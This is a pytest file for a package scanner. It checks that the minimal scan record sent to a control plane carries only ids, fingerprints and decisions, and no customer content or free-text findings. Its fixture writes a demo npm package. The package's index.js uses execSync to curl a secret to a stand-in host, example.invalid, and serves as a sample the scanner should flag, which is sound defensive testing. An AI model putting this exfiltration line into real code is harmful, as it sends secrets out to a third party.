"""Row BP-1-4: the execution plane sends the control plane only minimal records (ids, digests, findings, decisions).

The record is a `scan/v1` document built by an allowlist from a real scan. These tests scan a small package whose files carry a
marker no rule or contract mentions, and check that nothing of the customer's content, and none of the free text the report
carries about it, is in the record; that the record is valid against its contract; and that the check an ingest test runs
refuses a document with anything more in it.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from cordon_scanner import Scanner
from cordon_scanner.cloud.minimal_record import MinimalRecord
from cordon_scanner.foundation.config.settings import Config

MARKER = "PAYLOAD_MARKER_91c4e7d2"


class Package:
    @staticmethod
    def scan(tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "demo-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": f"node -e \"console.log('{MARKER}')\""},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "index.js").write_text(
            f"const secret = '{MARKER}';\nrequire('child_process').execSync('curl http://example.invalid/' + secret);\n",
            encoding="utf-8",
        )
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)


class TestTheRecordOfARealScan:
    def test_it_validates_against_its_contract_and_the_allowlist(self, tmp_path: Path) -> None:
        result = Package.scan(tmp_path)
        record = MinimalRecord.of(result)
        assert record["findings"], "the scan found something"
        assert MinimalRecord.problems(record) == []

    def test_every_unsuppressed_finding_is_there_with_its_ids_and_hash(
        self, tmp_path: Path
    ) -> None:
        result = Package.scan(tmp_path)
        record = MinimalRecord.of(result)
        expected = sorted(f.fingerprint for f in result.findings if not f.is_suppressed)
        assert sorted(item["fingerprint"] for item in record["findings"]) == expected
        for item in record["findings"]:
            assert set(item) <= MinimalRecord.FINDING
            assert item["rule_id"] and item["detector"]

    def test_nothing_of_the_content_or_the_free_text_about_it_leaves(self, tmp_path: Path) -> None:
        result = Package.scan(tmp_path)
        text = json.dumps(MinimalRecord.of(result))
        assert MARKER not in text
        for finding in result.findings:
            assert finding.message not in text
            assert finding.remediation not in text

    def test_the_gaps_are_rule_ids_not_paths(self, tmp_path: Path) -> None:
        record = MinimalRecord.of(Package.scan(tmp_path))
        assert all(
            isinstance(gap, str) and "/" not in gap for gap in record["completeness"]["gaps"]
        )

    def test_the_same_scan_gives_the_same_record(self, tmp_path: Path) -> None:
        result = Package.scan(tmp_path)
        assert json.dumps(MinimalRecord.of(result), sort_keys=True) == json.dumps(
            MinimalRecord.of(result), sort_keys=True
        )


class TestWhatTheCheckRefuses:
    @staticmethod
    def record(tmp_path: Path) -> dict[str, Any]:
        return MinimalRecord.of(Package.scan(tmp_path))

    @pytest.mark.parametrize(
        "key", ["message", "remediation", "evidence", "explanation", "risk", "snippet"]
    )
    def test_free_text_or_content_on_a_finding(self, tmp_path: Path, key: str) -> None:
        document = self.record(tmp_path)
        document["findings"][0][key] = "text"
        assert any(key in problem for problem in MinimalRecord.problems(document))

    def test_a_key_the_record_does_not_have_at_the_top(self, tmp_path: Path) -> None:
        document = self.record(tmp_path)
        document["dependencies"] = []
        assert any("dependencies" in problem for problem in MinimalRecord.problems(document))

    def test_a_location_with_more_than_a_path_and_a_line(self, tmp_path: Path) -> None:
        document = self.record(tmp_path)
        document["findings"][0]["location"]["column"] = 4
        assert any("column" in problem for problem in MinimalRecord.problems(document))

    def test_a_document_that_is_not_an_object(self) -> None:
        assert MinimalRecord.problems([]) == ["a minimal record is an object"]

    def test_a_record_that_breaks_its_contract(self, tmp_path: Path) -> None:
        document = self.record(tmp_path)
        document["findings"][0]["severity"] = "enormous"
        assert MinimalRecord.problems(document)


class TestTheVocabularyIsTheContracts:
    def test_every_category_severity_and_confidence_the_scanner_has_is_one_the_contract_names(
        self,
    ) -> None:
        from cordon_scanner.contracts.schemas import ContractSchemas
        from cordon_scanner.foundation.models import Category, Confidence, Severity

        schema = ContractSchemas.load("scan-v1")
        properties = schema["properties"]["findings"]["items"]["properties"]
        assert {c.name.lower() for c in Category} <= set(properties["category"]["enum"])
        assert {s.name.lower() for s in Severity} <= set(schema["$defs"]["severity"]["enum"])
        assert {c.name.lower() for c in Confidence} <= set(schema["$defs"]["confidence"]["enum"])
